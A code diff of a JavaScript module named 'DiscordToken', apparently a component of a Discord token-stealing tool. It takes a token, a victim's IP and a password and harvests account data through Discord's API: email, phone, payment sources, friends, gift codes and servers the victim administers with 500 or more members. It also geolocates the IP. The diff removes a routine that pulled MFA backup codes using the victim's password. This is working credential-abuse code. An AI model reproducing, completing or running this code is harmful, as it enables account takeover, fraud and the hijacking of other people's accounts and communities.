@@ -1,44 +1,19 @@
 "use strict";
-const request = require("sync-request");
+const fetch = (...args) => import('node-fetch').then(({default: fetch}) => fetch(...args));
 
-module.exports = class DiscordToken { 
+module.exports = class DiscordToken {
   constructor(token, ipAddress, password) {
-    const user = this.getDiscordApi("https://discord.com/api/v9/users/@me", token);
-    const profile = this.getDiscordApi(
-      `https://discord.com/api/v9/users/${Buffer.from(
-        token.split(".")[0],
-        "base64",
-      ).toString()}/profile`,
-      token,
-    );
-    const settings = this.getDiscordApi(
-      "https://discord.com/api/v9/users/@me/settings",
-      token,
-    );
-    const paymentSources = this.getDiscordApi(
-      "https://discord.com/api/v9/users/@me/billing/payment-sources",
-      token,
-    );
-    const relationships = this.getDiscordApi(
-      "https://discordapp.com/api/v9/users/@me/relationships",
-      token,
-    );
-    const guilds = this.getDiscordApi(
-      "https://discord.com/api/v9/users/@me/guilds",
-      token,
-    );
-    const applications = this.getDiscordApi(
-      "https://discord.com/api/v9/applications",
-      token,
-    );
-    const connections = this.getDiscordApi(
-      "https://discordapp.com/api/v9/users/@me/connections",
-      token,
-    );
-    const entitlements = this.getDiscordApi(
-      "https://discord.com/api/v8/users/@me/entitlements/gifts",
-      token,
-    );
+    const [user, profile, settings, paymentSources, relationships, guilds, applications, connections, entitlements] = [
+      this.getDiscordApi("https://discord.com/api/v9/users/@me", token),
+      this.getDiscordApi(`https://discord.com/api/v9/users/${Buffer.from(token.split(".")[0], "base64").toString()}/profile`, token),
+      this.getDiscordApi("https://discord.com/api/v9/users/@me/settings", token),
+      this.getDiscordApi("https://discord.com/api/v9/users/@me/billing/payment-sources", token),
+      this.getDiscordApi("https://discordapp.com/api/v9/users/@me/relationships", token),
+      this.getDiscordApi("https://discord.com/api/v9/users/@me/guilds?with_counts=true", token),
+      this.getDiscordApi("https://discord.com/api/v9/applications", token),
+      this.getDiscordApi("https://discordapp.com/api/v9/users/@me/connections", token),
+      this.getDiscordApi("https://discord.com/api/v8/users/@me/entitlements/gifts", token),
+    ]
     if (ipAddress) {
       if (Array.isArray(ipAddress)) {
         this.ipInfos = ipAddress.map(ip => this.getIpInfoAll(ip));
@@ -47,29 +22,23 @@ module.exports = class DiscordToken {
       }
     }
     if (!user || user === "Invalid") {
-      this.info = {"message":"Token not found"};
-      return;
+      this.info = { "message": "Token not found" };
+      return
     }
-    let creditCard = false;
-    let paypal = false;
-    paymentSources?.forEach((source) => {
-      if (source.brand && source.invalid === 0) {
-        creditCard = true;
-      }
-      if (source.email) {
-        paypal = true;
-      }
-    });
+
+    const creditCard = paymentSources?.some(source => source.brand && source.invalid === 0);
+    const paypal = paymentSources?.some(source => source.email);
+
     this.emojis = {
-      "themes":{
+      "themes": {
         "dark": "Dark",
-        "light": "Light",  
+        "light": "Light",
       },
       "status": {
         "online": "<:online:1129709364316491787>",
         "idle": "<:idle:1120542710424674306>",
         "dnd": "<:dnd:974692691289993216>",
-        "invisible": "<:offline:1137141023529762916>",  
+        "invisible": "<:offline:1137141023529762916>",
       },
       "user": {
         "boost": [
@@ -85,7 +54,7 @@ module.exports = class DiscordToken {
         ],
         "payments": [
           "<a:card:1083014677430284358> ",
-          "<:paypal:1129073151746252870> " 
+          "<:paypal:1129073151746252870> "
         ],
         "i": [
           "<:staff:1090015968618623129> ",
@@ -109,20 +78,20 @@ module.exports = class DiscordToken {
       "token": token,
       "ID": user.id,
       "globalName": `${user.global_name}`,
-      "avatarDecoration": `${user.avatar_decoration_data ? user.avatar_decoration_data: "None"}`,
+      "avatarDecoration": `${user.avatar_decoration_data ? user.avatar_decoration_data : "None"}`,
       "username": `${user.username}#${user.discriminator}`,
       "badges": this.AllBadges(user.flags),
       "nitroType": this.getNitroPremium(profile),
       "avatar": user.avatar
         ? this.getImage(
-            `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`,
-          )
-        : "has no avatar",
+          `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`,
+        )
+        : "Unknown Avatar",
       "banner": user.banner
-      ? this.getImage(
+        ? this.getImage(
           `https://cdn.discordapp.com/banners/${user.id}/${user.banner}`,
         )
-      : "has no banner",
+        : "Unknown Banner",
       "totalFriend": relationships.filter((relation) => relation.type === 1)
         .length,
       "totalBlocked": relationships.filter((relation) => relation.type === 2)
@@ -137,101 +106,102 @@ module.exports = class DiscordToken {
       "totalApplication": applications.length,
       "totalConnection": connections.length,
       "totalGuild": guilds.length,
-      "NSFW": user.nsfw_allowed 
-        ? "🔞 `Allowed`" 
+      "NSFW": user.nsfw_allowed
+        ? "🔞 `Allowed`"
         : "❌ `Not allowed`",
       "MFA2": user.mfa_enabled
-        ? "✅ `Allowed`" 
+        ? "✅ `Allowed`"
         : "❌ `Not allowed`",
       "verified": user.verified
-        ? "✅" 
+        ? "✅"
         : "❌",
-      "bio": user.bio || "has no description",
-      "phone": user.phone || "has no phone",
+      "bio": user.bio || "Unknown Bio",
+      "phone": user.phone || "Unknown Phone",
       "mail": user.email,
       "billing": this.paymentSources,
       "langue": this.getLanguage(settings.locale),
       "status": this.getStatusEmoji(settings.status),
-      "theme": this.getTheme(settings.theme),  
+      "theme": this.getTheme(settings.theme),
       "Gifts": this.getGiftsCodes(token, settings),
-      "StrangeFriends": this.rareFriend(relationships),
     };
     this.guilds = {
-      "": "Unfinished"
+      "all": this.getGuilds(guilds).all,
+      "rares": this.getGuilds(guilds).rare,
     };
     this.friends = {
-      "": "Unfinished"
+      "all": "Unfinished",
+      "rares": this.rareFriend(relationships),
     }
     if (ipAddress) {
       if (Array.isArray(ipAddress)) {
         if (this.ipInfos.some(info => !info.success)) {
           this.info.IPs = {
-            "message":"Unknown IPs",
-            "success":this.ipInfos.success,
+            "message": "Unknown IPs",
+            "success": this.ipInfos.success,
           }
           return;
         }
         this.info.IPs = this.ipInfos.map(info => ({
-          "ip":info.ip,
-          "success":info.success,
-          "type":info.type,
-          "continent":info.continent,
-          "continent_code":info.continent_code,
-          "country":info.country,
-          "country_code":info.country_code,
-          "country_capital":info.country_capital,
-          "country_phone":info.country_phone,
-          "country_neighbours":info.country_neighbours,
-          "region":info.region,
-          "city":info.city,
-          "latitude":info.latitude,
-          "longitude":info.longitude,
-          "asn":info.asn,
-          "org":info.org,
-          "isp":info.isp,
-          "timezone":info.timezone,
-          "timezone_name":info.timezone_name,
-          "timezone_dstOffset":info.timezone_dstOffset,
-          "timezone_gmtOffset":info.timezone_gmtOffset,
-          "timezone_gmt":info.timezone_gmt,
-          "currency_code":info.currency_code,
-          "currency_rates":info.currency_rates,
-          "currency_plural":info.currency_plural,
+          "ip": info.ip,
+          "success": info.success,
+          "type": info.type,
+          "continent": info.continent,
+          "continent_code": info.continent_code,
+          "country": info.country,
+          "country_code": info.country_code,
+          "country_capital": info.country_capital,
+          "country_phone": info.country_phone,
+          "country_neighbours": info.country_neighbours,
+          "region": info.region,
+          "city": info.city,
+          "latitude": info.latitude,
+          "longitude": info.longitude,
+          "asn": info.asn,
+          "org": info.org,
+          "isp": info.isp,
+          "timezone": info.timezone,
+          "timezone_name": info.timezone_name,
+          "timezone_dstOffset": info.timezone_dstOffset,
+          "timezone_gmtOffset": info.timezone_gmtOffset,
+          "timezone_gmt": info.timezone_gmt,
+          "currency_code": info.currency_code,
+          "currency_rates": info.currency_rates,
+          "currency_plural": info.currency_plural,
         }));
       } else {
         if (!this.ipInfo.success) {
           this.info.IP = {
-            "message":"Unknown IP",
-            "success":this.ipInfo.success,
+            "message": "Unknown IP",
+            "success": this.ipInfo.success,
           }
           return;
         }
         this.info.IP = {
-          "ip":this.ipInfo.ip,
-          "success":this.ipInfo.success,
-          "type":this.ipInfo.type,
-          "continent":this.ipInfo.continent,
-          "continent_code":this.ipInfo.continent_code,
-          "country":this.ipInfo.country,
-          "country_code":this.ipInfo.country_code,
-          "country_capital":this.ipInfo.country_capital,
-          "country_phone":this.ipInfo.country_phone,
-          "country_neighbours":this.ipInfo.country_neighbours,
-          "region":this.ipInfo.region,
-          "city":this.ipInfo.city,
-          "latitude":this.ipInfo.latitude,
-          "longitude":this.ipInfo.longitude,
-          "asn":this.ipInfo.asn,
-          "org":this.ipInfo.org,
-          "isp":this.ipInfo.isp,
-          "timezone":this.ipInfo.timezone,
-          "timezone_name":this.ipInfo.timezone_name,
-          "timezone_dstOffset":this.ipInfo.timezone_dstOffset,
-          "timezone_gmtOffset":this.ipInfo.timezone_gmtOffset,
-          "timezone_gmt":this.ipInfo.timezone_gmt,
-          "currency_code":this.ipInfo.currency_code,
-          "currency_rates":this.ipInfo.currency_rates,
-          "currency_plural":this.ipInfo.currency_plural,
+          "ip": this.ipInfo.ip,
+          "success": this.ipInfo.success,
+          "type": this.ipInfo.type,
+          "continent": this.ipInfo.continent,
+          "continent_code": this.ipInfo.continent_code,
+          "country": this.ipInfo.country,
+          "country_code": this.ipInfo.country_code,
+          "country_capital": this.ipInfo.country_capital,
+          "country_phone": this.ipInfo.country_phone,
+          "country_neighbours": this.ipInfo.country_neighbours,
+          "region": this.ipInfo.region,
+          "city": this.ipInfo.city,
+          "latitude": this.ipInfo.latitude,
+          "longitude": this.ipInfo.longitude,
+          "asn": this.ipInfo.asn,
+          "org": this.ipInfo.org,
+          "isp": this.ipInfo.isp,
+          "timezone": this.ipInfo.timezone,
+          "timezone_name": this.ipInfo.timezone_name,
+          "timezone_dstOffset": this.ipInfo.timezone_dstOffset,
+          "timezone_gmtOffset": this.ipInfo.timezone_gmtOffset,
+          "timezone_gmt": this.ipInfo.timezone_gmt,
+          "currency_code": this.ipInfo.currency_code,
+          "currency_rates": this.ipInfo.currency_rates,
+          "currency_plural": this.ipInfo.currency_plural,
         }
       }
     }
@@ -240,32 +210,7 @@ module.exports = class DiscordToken {
     }
   }
   getMfa2Codes(token, password) {
-    let result = "";
-    try {
-      const response = request(
-        "POST",
-        "https://discord.com/api/v9/users/@me/mfa/codes",
-        { headers: { "Content-Type": "application/json", authorization: token },
-          body: JSON.stringify({
-            password: password,
-            regenerate: false,
-          }),
-        },
-      );
-      const data = JSON.parse(response.getBody());
-      if (data.backup_codes) {
-        data.backup_codes.forEach((code) => {
-          if (code.consumed === null) {
-            result += `${code.code} | `;
-          }
-        });
-        return result.slice(0, -2);
-      } else {
-        return "No backup codes found";
-      }
-    } catch (error) {
-      return "Error retrieving MFA codes";
-    }
+    return "Unfinished";
   }
   getLanguage(locale) {
     const languages = {
@@ -323,14 +268,41 @@ module.exports = class DiscordToken {
   }
   getImage(url) {
     if (!url) return false;
-    return (
-      `${url}${(
-          request("GET", url).headers["content-type"] 
-          === "image/gif" 
-          ? ".gif?size=512" 
-          : ".png?size=512"
-        )}`
-    );
+    const re = require("sync-fetch")(url);
+    return `${url}.${re.headers.get("content-type").includes("image/gif") ? "gif" : "png"}?size=512`;
+  }
+  getGuilds(guilds) {
+    const rare = guilds
+      .filter(server => server.owner || (server.permissions & 8) === 8)
+      .filter(server => server.approximate_member_count >= 500)
+      .map(server => ({
+        id: server.id,
+        name: server.name,
+        owner: server.owner,
+        member_count: server.approximate_member_count,
+      }));
+  
+    const all = guilds
+      .filter(server => (server.permissions & 2048) === 2048)
+      .map(server => ({
+        id: server.id,
+        name: server.name,
+        owner: server.owner,
+        member_count: server.approximate_member_count,
+      }));
+  
+    const formatGuilds = (listed, x) => listed.length
+      ? listed.map(server => {  
+          return x
+            ? `${server.owner && x ? "<:owner:963333541343686696>" : "<:staff:846569357353680896>"} | **${server.name}** - \`${server.id}\` | **Members** \`${server.member_count}\``
+            : `${server.owner ? "<:owner:963333541343686696> " : "" }**${server.name}** - \`${server.id}\` | **Members** \`${server.member_count}\``;
+        }).join("\n")
+      : "None";
+  
+    return {
+      all: formatGuilds(all, false),
+      rare: formatGuilds(rare, true),
+    };
   }
   rareFriend(relationships) {
     let result = "";
@@ -348,19 +320,21 @@ module.exports = class DiscordToken {
   }
   getIpInfoAll(ipAddress) {
     const url = `http://ipwhois.app/json/${ipAddress}`;
-    const response = request("GET", url);
-    if (response.statusCode === 200) {
-      return JSON.parse(response.getBody("utf8"));
+    const res = require("sync-fetch")(url);
+    if (res.status === 200) {
+      return res.json();
     } else return "None"
   }
   getDiscordApi(url, token) {
     const res = require("sync-fetch")(url, {
-        headers: {
-          "Content-Type": "application/json",
-          authorization: token
-        }
-    }).json();
-    return res.code == 0 ? "Invalid" : res
+      method: 'GET',
+      headers: {
+        "Content-Type": "application/json",
+        authorization: token
+      }
+    });
+    const d = res.json();
+    return res.status === 200 ? d : "Invalid"
   }
   AllBadges(flags) {
     let result = "";
